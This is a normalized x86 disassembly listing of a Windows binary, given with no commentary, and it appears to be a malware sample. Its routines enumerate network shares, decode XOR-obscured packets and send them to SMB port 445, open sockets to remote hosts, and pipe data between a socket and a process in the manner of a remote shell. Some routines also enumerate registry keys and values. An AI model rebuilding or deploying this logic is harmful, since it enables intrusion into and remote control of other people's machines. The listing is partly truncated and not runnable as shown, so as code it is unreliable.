mov [ esp + 0x34 ] ebp
push eax
mov [ esp + 0x3c ] 0x3
mov [ esp + 0x44 ] ebp
mov [ esp + 0x48 ] ebp
mov [ esp + 0x4c ] ebp
mov [ esp + 0x50 ] ebp
mov [ esp + 0x20 ] ebp
mov [ esp + 0x24 ] 0x4000
mov [ esp + 0x1c ] 0xffffffff
mov ebx 0x5
mov [ esp + 0x258 ] 0x47
call [ strstr@IAT ]
add esp 0x8
mov edi eax
cmp edi ebp
push 0x5c
je r-xdata
mov ecx [ rw-data ]
mov esi [ strrchr@IAT ]
push ecx
call esi
add esp 0x8
cmp eax ebp
je r-xdata
mov esi [ strchr@IAT ]
lea ecx [ edi + 0x3 ]
push ecx
call esi
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
mov [ esp + 0x255 ] 0x0
mov ebx 0x6
mov [ eax ] 0x0
mov ecx [ rw-data ]
cmp eax ecx
je r-xdata
lea edx [ ebp + 0x1 ]
push 0x5c
push edx
call esi
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x20 ]
lea eax [ esp + 0x2c ]
push edx
push eax
push ebp
push ebp
push 0x2
call [ esp + 0x24 ]
test eax eax
jne r-xdata
push 0x5c
push ecx
call esi
add esp 0x8
cmp eax ebp
je r-xdata
inc edi
mov [ ebp ] 0x0
mov [ esp + 0x40 ] edi
xor ebp ebp
jmp r-xdata
inc edi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ rw-data ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call sub_404e20
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4240
retn
mov ecx [ esp + 0x1c ]
push ecx
push 0x40
call [ GlobalAlloc@IAT ]
mov esi eax
mov [ esp + 0x28 ] esi
mov edx [ rw-data ]
lea ecx [ eax + 0x1 ]
cmp edx 0x2
mov [ esp + 0x40 ] ecx
jne r-xdata
push esi
call [ GlobalFree@IAT ]
mov edx [ esp + 0x20 ]
push edx
call WNetCloseEnum
cmp ebx 0x5
jne r-xdata
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x14 ]
test eax eax
jbe r-xdata
cmp eax [ rw-data ]
jne r-xdata
cmp eax [ rw-data ]
jne r-xdata
lea eax [ esp + 0x4c ]
lea ecx [ esp + 0x255 ]
push eax
lea edx [ ebx - 0x5 ]
push ecx
lea eax [ esp + 0x25d ]
push edx
push eax
mov [ esp + 0x261 ] ebx
call sub_403800
lea ecx [ esp + 0x260 ]
push ebx
push ecx
call sub_402970
add esp 0x18
mov ecx [ esp + 0x1c ]
xor eax eax
mov edx ecx
mov edi esi
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edx [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x18 ]
push esi
push ecx
push edx
call [ esp + 0x34 ]
test eax eax
jne r-xdata
lea ebp [ esi + 0x14 ]
mov [ esp + 0x18 ] 0x1
mov [ esp + 0x34 ] 0x6
mov [ esp + 0x38 ] 0x80000002
mov [ esp + 0x48 ] ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
inc eax
add ebp 0x20
cmp eax ecx
mov [ esp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
mov eax [ ebp ]
test eax eax
je r-xdata
jmp r-xdata
mov edi [ ebp ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebx + 0x250 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebp ]
or ecx 0xffffffff
mov edi edx
[ edi ]
mov eax [ esp + 0x18 ]
not ecx
dec ecx
add ebx ecx
test eax eax
je r-xdata
add eax 0x2
push 0x5c
push eax
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov esi [ esp + 0x28 ]
inc ebx
mov [ esp + ebx + 0x250 ] ecx
add ebx 0x4
lea ecx [ esp + 0x50 ]
push ecx
push edx
call sub_4064c0
lea edi [ esp + 0x58 ]
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + ebx + 0x250 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add ebx ecx
inc eax
mov [ ebp ] eax
sub_4064c0
cmp [ rw-data ] 0x1
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push edx
push eax
call sub_406500
add esp 0x8
retn
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
add ecx 0x2
push eax
push ecx
call sub_4067f0
add esp 0x8
retn
sub_406500
mov eax [ esp + 0x4 ]
sub esp 0x448
add eax 0x2
push ebx
push ebp
push esi
push edi
push eax
call [ Ordinal_WSOCK32_52@IAT ]
mov ebp [ sprintf@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea ecx [ esp + 0x1c ]
push rw-data
push ecx
call ebp
add esp 0xc
jmp r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov al [ esp + 0x18 ]
test al al
jne r-xdata
mov edi [ GetProcAddress@IAT ]
push rw-data
push esi
call edi
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ esp + 0x460 ]
push rw-data
push ecx
call ebp
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x448
retn
push rw-data
push esi
call edi
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
lea edx [ esp + 0x18 ]
push edx
push rw-data
jmp r-xdata
lea edx [ esp + 0x18 ]
push edx
push rw-data
mov edx [ esp + 0x45c ]
lea ecx [ esp + 0x58 ]
push 0x200
push ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x18 ] 0x0
[ edi ]
not ecx
push ecx
push edx
push eax
push eax
call [ MultiByteToWideChar@IAT ]
lea edx [ esp + 0x58 ]
lea eax [ esp + 0x258 ]
push edx
push rw-data
push eax
call [ swprintf@IAT ]
add esp 0xc
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x258 ]
push ecx
push 0x65
push edx
call ebx
test eax eax
jne r-xdata
mov eax [ esp + 0x468 ]
push eax
call ebp
add esp 0xc
mov ecx [ esp + 0x460 ]
lea eax [ esp + 0x18 ]
push eax
push rw-data
push ecx
call ebp
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x448
retn
mov ecx [ esp + 0x10 ]
mov eax [ ecx ]
cmp eax 0x1f4
ja r-xdata
sub eax 0x258
je r-xdata
je r-xdata
lea edx [ esp + 0x18 ]
push edx
push rw-data
sub eax 0x64
je r-xdata
mov eax [ ecx + 0x8 ]
cmp eax 0x5
jne r-xdata
sub eax 0x12c
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ ecx + esi - 0x1 ] 0x53
mov [ ecx + esi ] 0x5d
mov [ ecx + esi + 0x1 ] al
mov eax [ esp + 0x10 ]
test ch 0x80
je r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
jmp r-xdata
lea eax [ esp + 0x18 ]
push eax
push rw-data
jmp r-xdata
mov ecx [ ecx + 0xc ]
mov esi [ esp + 0x460 ]
push ecx
lea edx [ esp + 0x1c ]
push eax
push edx
push rw-data
push esi
call ebp
add esp 0x14
jmp r-xdata
mov eax [ ecx + 0xc ]
test eax eax
jne r-xdata
lea edx [ esp + 0x18 ]
push edx
push rw-data
jmp r-xdata
sub eax 0x64
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x448
retn
push eax
call [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x448
retn
test eax eax
je r-xdata
mov esi [ esp + 0x468 ]
push esi
call ebp
add esp 0xc
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x10 ]
test cl 0x18
jne r-xdata
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x18 ]
push eax
push rw-data
jmp r-xdata
cmp [ ecx + 0x8 ] 0x4
jne r-xdata
cmp eax 0x2
jne r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
jmp r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
jmp r-xdata
lea eax [ esp + 0x18 ]
push eax
push rw-data
jmp r-xdata
mov esi [ esp + 0x460 ]
push eax
lea eax [ esp + 0x1c ]
push 0x5
push eax
push rw-data
push esi
call ebp
add esp 0x14
jmp r-xdata
lea edx [ esp + 0x18 ]
push edx
push rw-data
jmp r-xdata
sub_4067f0
sub esp 0x358
mov ecx 0x22
xor eax eax
push esi
push edi
mov esi rw-data
lea edi [ esp + 0x44 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x2a
mov esi rw-data
lea edi [ esp + 0xd0 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx 0x37
mov esi rw-data
lea edi [ esp + 0x17c ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov cl [ esp + eax + 0x44 ]
xor cl 0x93
mov [ esp + eax + 0x44 ] cl
inc eax
cmp eax 0x89
jb r-xdata
xor eax eax
mov cl [ esp + eax + 0xd0 ]
xor cl 0x93
mov [ esp + eax + 0xd0 ] cl
inc eax
cmp eax 0xa8
jb r-xdata
xor eax eax
mov cl [ esp + eax + 0x17c ]
xor cl 0x93
mov [ esp + eax + 0x17c ] cl
inc eax
cmp eax 0xde
jb r-xdata
mov eax [ esp + 0x364 ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x24 ]
mov edi rw-data
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ Ordinal_WSOCK32_11@IAT ]
lea edx [ esp + 0x24 ]
mov edi eax
jmp r-xdata
mov edi 0x1
push 0x0
push edi
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi [ esp + 0x368 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x358
retn
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov al [ esp + 0x24 ]
test al al
jne r-xdata
push 0x1bd
mov [ esp + 0x18 ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
lea edx [ esp + 0x24 ]
mov [ esp + 0x16 ] ax
push edx
call [ Ordinal_WSOCK32_10@IAT ]
mov [ esp + 0x18 ] eax
lea ecx [ esp + 0x8 ]
xor eax eax
push ecx
mov [ esp + 0x20 ] eax
push 0x8004667e
push esi
mov [ esp + 0x2c ] eax
mov [ esp + 0x14 ] edi
call [ Ordinal_WSOCK32_12@IAT ]
lea edx [ esp + 0x14 ]
push 0x10
push edx
push esi
mov [ esp + 0x18 ] 0x2
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x26c ] esi
mov [ esp + 0x268 ] edi
call [ rw-data ]
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x25c ]
push eax
push 0x0
push ecx
lea edx [ esi + 0x1 ]
push 0x0
push edx
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jg r-xdata
mov ecx [ esp + 0x368 ]
lea eax [ esp + 0x24 ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0xc
pop edi
pop esi
add esp 0x358
retn
push edi
mov edi [ esp + 0x36c ]
lea edx [ esp + 0x28 ]
push edi
push edx
lea eax [ esp + 0x50 ]
push 0x89
push eax
push esi
call sub_406a70
add esp 0x18
test eax eax
je r-xdata
mov ecx [ esp + 0x368 ]
lea eax [ esp + 0x24 ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0xc
push esi
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
add esp 0x358
retn
pop edi
pop esi
add esp 0x358
retn
push 0x2
lea ecx [ esp + 0x28 ]
push edi
push ecx
lea edx [ esp + 0xdc ]
push 0xa8
push edx
push esi
call sub_406a70
add esp 0x18
test eax eax
je r-xdata
push 0x3
lea eax [ esp + 0x28 ]
push edi
push eax
lea ecx [ esp + 0x188 ]
push 0xde
push ecx
push esi
call sub_406a70
add esp 0x18
push esi
call [ Ordinal_WSOCK32_3@IAT ]
sub_406a70
mov eax 0x1120
call sub_4076c0
push ebx
push ebp
mov ebp [ Ordinal_WSOCK32_12@IAT ]
push esi
mov esi [ esp + 0x1130 ]
lea eax [ esp + 0xc ]
push edi
push eax
mov edi 0x1
push 0x8004667e
push esi
mov [ esp + 0x1c ] edi
call ebp
mov ecx [ esp + 0x113c ]
mov edx [ esp + 0x1138 ]
push 0x0
push ecx
push edx
push esi
mov [ esp + 0x24 ] 0x2
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x40 ] esi
mov [ esp + 0x3c ] edi
call [ rw-data ]
mov ebx [ Ordinal_WSOCK32_18@IAT ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x30 ]
push 0x0
lea edi [ esi + 0x1 ]
push ecx
push 0x0
push edi
call ebx
test eax eax
jg r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x1
push ecx
push 0x8004667e
push esi
call ebp
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x2c ]
push edx
push 0x0
push 0x0
push eax
push edi
mov [ esp + 0x28 ] 0x4
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x44 ] esi
mov [ esp + 0x40 ] 0x1
call ebx
test eax eax
jle r-xdata
mov edx [ esp + 0x1140 ]
push edx
push rw-data
jmp r-xdata
mov edx [ esp + 0x1140 ]
push edx
push rw-data
push 0x0
lea ecx [ esp + 0x134 ]
push 0x640
push ecx
push esi
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x114c ]
push eax
call [ sprintf@IAT ]
add esp 0xc
push esi
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1120
retn
cmp [ esp + 0x1148 ] 0x3
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x1120
retn
xor eax eax
lea ecx [ esp + 0x160 ]
mov dl [ ecx ]
add ecx 0x2
mov [ esp + eax + 0x1c ] dl
inc eax
cmp eax 0xc
jl r-xdata
mov ecx [ esp + 0x1140 ]
mov edx [ esp + 0x1144 ]
mov [ esp + eax + 0x1c ] 0x0
lea eax [ esp + 0x1c ]
push eax
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0x10
sub_406c10
sub esp 0x258
push ebp
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov ebp [ esp + 0x268 ]
push rw-data
push ebp
mov [ esp + 0x14 ] eax
call [ strstr@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x20 ]
lea edx [ esp + 0x20 ]
[ edi ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x4c ] 0x1
push ecx
push edx
push eax
push eax
push eax
push eax
push eax
push eax
push ebp
push eax
mov [ esp + 0x78 ] ax
call [ rw-data ]
pop edi
pop esi
pop ebp
add esp 0x258
retn
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x64 ]
mov eax ecx
mov esi edi
mov edi edx
push 0x22
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ strchr@IAT ]
lea ecx [ esp + 0x68 ]
push ecx
call esi
add esp 0x8
test eax eax
je r-xdata
inc eax
push 0x22
push eax
call esi
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x64 ]
push 0x5c
push edx
mov [ eax ] 0x0
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] 0x0
mov [ eax + 0x1 ] 0x0
jmp r-xdata
lea eax [ esp + 0x65 ]
push eax
call [ esp + 0x10 ]
sub_406d00
push ecx
mov [ rw-data ] 0x4f
call sub_405230
mov eax [ rw-data ]
test eax eax
jne r-xdata
pop ecx
retn
lea eax [ esp ]
push eax
push 0x0
push 0x0
push sub_406d30
push 0x0
push 0x0
call [ CreateThread@IAT ]
sub_406d30
mov eax 0x153c
call sub_4076c0
push ebx
push ebp
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov edi [ GetProcAddress@IAT ]
mov esi eax
push rw-data
push esi
call edi
push rw-data
push esi
mov [ esp + 0x24 ] eax
call edi
mov esi eax
mov eax 0x1
xor ebp ebp
mov [ rw-data ] eax
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x2c ]
push ebp
lea ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x20 ]
or ebx 0xffffffff
push ecx
push edx
mov [ esp + 0x20 ] ebp
mov [ esp + 0x24 ] ebx
mov [ esp + 0x3c ] 0xc
mov [ esp + 0x40 ] ebp
call esi
lea eax [ esp + 0x2c ]
push ebp
lea ecx [ esp + 0x24 ]
push eax
lea edx [ esp + 0x30 ]
push ecx
push edx
call esi
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x50 ]
mov edx [ rw-data ]
[ edi ]
mov eax [ esp + 0x28 ]
mov ecx [ rw-data ]
mov [ esp + 0x88 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x90 ] eax
mov [ esp + 0x8c ] eax
mov [ esp + 0x38 ] ecx
lea eax [ esp + 0x40 ]
lea ecx [ esp + 0x50 ]
push eax
push ecx
push ebp
push ebp
push ebp
mov [ esp + 0x50 ] edx
push 0x1
push ebp
lea edx [ esp + 0x54 ]
push ebp
push edx
push ebp
mov [ esp + 0xa4 ] 0x101
mov [ esp + 0xa8 ] bp
call [ rw-data ]
push 0x3e8
call [ rw-data ]
call sub_407100
mov ebp eax
test ebp ebp
je r-xdata
mov edx [ esp + 0x40 ]
push 0x0
push edx
call [ esp + 0x24 ]
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x0
mov eax 0x1
pop ebx
add esp 0x153c
retn 0x4
mov eax [ rw-data ]
lea edx [ esp + 0x94 ]
test eax eax
mov edi rw-data
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x94 ]
or ecx 0xffffffff
[ edi ]
not ecx
add ecx 0x3
push ecx
mov ecx [ rw-data ]
push 0x1
push rw-data
push 0x52
push ecx
call [ Ordinal_WSOCK32_11@IAT ]
lea edx [ esp + 0x1a4 ]
push eax
push edx
call sub_403460
lea edi [ esp + 0x1ac ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x94 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x94 ]
mov [ esp + edx + 0x194 ] ecx
or ecx 0xffffffff
add edx 0x4
lea esi [ esp + 0x94 ]
[ edi ]
not ecx
dec ecx
lea edi [ esp + edx + 0x194 ]
mov eax ecx
push 0x0
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x98 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
lea ecx [ esp + 0x19c ]
push ecx
push ebp
call [ rw-data ]
push 0x64
mov edi rw-data
test ebx ebx
jg r-xdata
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x10 ]
push 0x0
push edx
push eax
lea eax [ esp + 0xd58 ]
push eax
push ecx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
cmp ebx 0x7ff
mov eax 0x7ff
ja r-xdata
push ebp
call sub_403720
add esp 0x4
test eax eax
je r-xdata
push ebp
call [ Ordinal_WSOCK32_3@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
lea ecx [ esp + 0xd50 ]
push eax
push ecx
push ebp
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
jle r-xdata
mov eax ebx
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ rw-data ]
add edx 0x4
push edx
push 0x1
push rw-data
push 0x52
push eax
call [ Ordinal_WSOCK32_11@IAT ]
lea ecx [ esp + 0x1a4 ]
push eax
push ecx
call sub_403460
lea edi [ esp + 0x1ac ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
mov eax [ esp + 0x10 ]
lea esi [ esp + 0xd4c ]
not ecx
dec ecx
mov ebx ecx
mov ecx eax
mov edx ecx
mov [ esp + ebx + 0x194 ] eax
add ebx 0x4
shr ecx 0x2
lea edi [ esp + ebx + 0x194 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
add ebx eax
[ edi ] [ esi ]
push ebp
mov [ esp + 0x18 ] 0xffffffff
call [ Ordinal_WSOCK32_3@IAT ]
push 0x64
call [ rw-data ]
call sub_407100
mov ebp eax
test ebp ebp
je r-xdata
mov ecx [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
push 0x0
push edx
sub ebx eax
push eax
lea eax [ esp + 0xd58 ]
mov [ esp + 0x20 ] ebx
push eax
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp eax 0x3e800
jge r-xdata
sub ebx eax
test ebx ebx
jg r-xdata
push 0xa
jmp r-xdata
push ebp
call sub_4071a0
add esp 0x4
cmp eax 0xffffffff
mov [ esp + 0x14 ] eax
je r-xdata
push 0x0
lea eax [ esp + 0x198 ]
push ebx
push eax
push ebp
call [ rw-data ]
test eax eax
jl r-xdata
push 0xa
call [ rw-data ]
mov ebx [ esp + 0x14 ]
jmp r-xdata
call [ rw-data ]
mov ebx eax
mov ecx [ esp + 0x18 ]
push 0x0
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ esp + 0xd58 ]
push 0x800
push eax
push ecx
call [ PeekNamedPipe@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
sub_407100
sub esp 0x10
push ebx
push esi
push edi
mov edi [ rw-data ]
push 0x0
push 0x1
push 0x2
mov ebx 0x52
call [ Ordinal_WSOCK32_23@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x10
retn
push ebx
mov [ esp + 0x10 ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
mov [ esp + 0xe ] ax
lea eax [ esp + 0xc ]
push 0x10
push eax
push esi
mov [ esp + 0x1c ] edi
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x10
retn
push esi
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x10
retn
push rw-data
call [ Ordinal_WSOCK32_10@IAT ]
mov ebx [ rw-data ]
mov edi eax
sub_4071a0
mov ecx [ esp + 0x4 ]
sub esp 0x10
lea eax [ esp ]
push 0x0
push 0x4
push eax
push ecx
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0x4
je r-xdata
mov eax [ esp ]
add esp 0x10
retn
or eax 0xffffffff
add esp 0x10
retn
sub_4071d0
push ecx
push esi
push edi
push 0x3e800
mov esi 0x5
call [ malloc@IAT ]
mov edi eax
add esp 0x4
test edi edi
je r-xdata
lea ecx [ esp + 0x8 ]
lea eax [ edi + 0x5 ]
push ecx
lea edx [ esi - 0x5 ]
push eax
push edx
push eax
mov [ edi + 0x1 ] esi
call sub_403800
push esi
push edi
call sub_402970
push edi
call [ free@IAT ]
add esp 0x1c
pop edi
pop esi
pop ecx
retn
lea eax [ edi + 0x5 ]
mov [ edi ] 0x61
push eax
mov eax [ rw-data ]
mov edx [ eax ]
lea ecx [ eax + 0x4 ]
push ecx
push edx
call sub_407380
lea esi [ eax + 0x5 ]
mov [ esp + 0x14 ] eax
mov [ edi + esi ] 0x1
inc esi
lea eax [ edi + esi ]
push eax
mov eax [ rw-data ]
mov edx [ eax ]
lea ecx [ eax + 0x4 ]
push ecx
push edx
call sub_407400
add esp 0x18
mov [ esp + 0x8 ] eax
add esi eax
sub_407260
push esi
mov esi [ rw-data ]
push edi
or ecx 0xffffffff
lea edx [ esi + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
push eax
mov eax [ esi ]
push edx
push eax
call sub_4075c0
add esp 0xc
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_405230
pop edi
pop esi
retn
sub_4072a0
push ebx
mov ebx [ rw-data ]
push esi
push edi
lea edx [ ebx + 0x4 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
lea esi [ ecx + edx + 0x1 ]
or ecx 0xffffffff
mov edi esi
[ edi ]
not ecx
dec ecx
lea eax [ ecx + esi + 0x1 ]
mov ecx [ ecx + esi + 0x5 ]
push ecx
lea ecx [ eax + 0x8 ]
mov eax [ eax ]
push ecx
mov ecx [ ebx ]
push eax
push esi
push edx
push ecx
call sub_407560
add esp 0x18
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_405230
pop edi
pop esi
pop ebx
retn
sub_407300
push esi
mov esi [ rw-data ]
push edi
or ecx 0xffffffff
lea edx [ esi + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
push eax
mov eax [ esi ]
push edx
push eax
call sub_4074a0
add esp 0xc
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_405230
pop edi
pop esi
retn
sub_407340
push esi
mov esi [ rw-data ]
push edi
or ecx 0xffffffff
lea edx [ esi + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
push eax
mov eax [ esi ]
push edx
push eax
call sub_407510
add esp 0xc
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_405230
pop edi
pop esi
retn
sub_407380
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ebx
lea eax [ esp + 0xc ]
push esi
xor esi esi
push eax
push 0xf003f
push esi
push ecx
push edx
xor ebx ebx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push ebp
mov ebp [ esp + 0x18 ]
push edi
pop esi
xor eax eax
pop ebx
retn
mov edx [ esp + 0x18 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
mov eax esi
pop ebp
pop esi
pop ebx
retn
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
inc ebx
lea esi [ esi + ecx + 0x1 ]
jmp r-xdata
mov ecx [ esp + 0x18 ]
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
lea edi [ esi + ebp ]
push 0x0
push eax
push edi
push ebx
push ecx
mov [ esp + 0x34 ] 0x104
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
sub_407400
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ebx
lea eax [ esp + 0x8 ]
push esi
xor esi esi
push eax
push 0xf003f
push esi
push ecx
push edx
xor ebx ebx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push ebp
mov ebp [ RegEnumValueA@IAT ]
push edi
mov edi [ esp + 0x1c ]
pop esi
xor eax eax
pop ebx
retn
mov edx [ esp + 0x14 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
mov eax esi
pop ebp
pop esi
pop ebx
retn
mov eax [ esp + 0x18 ]
inc ebx
mov [ esi + edi + 0x104 ] eax
mov ecx [ esp + 0x18 ]
lea esi [ esi + ecx + 0x108 ]
jmp r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ edi + esi + 0x108 ]
push eax
lea edx [ edi + esi + 0x100 ]
push ecx
push edx
mov edx [ esp + 0x20 ]
lea eax [ esp + 0x28 ]
push 0x0
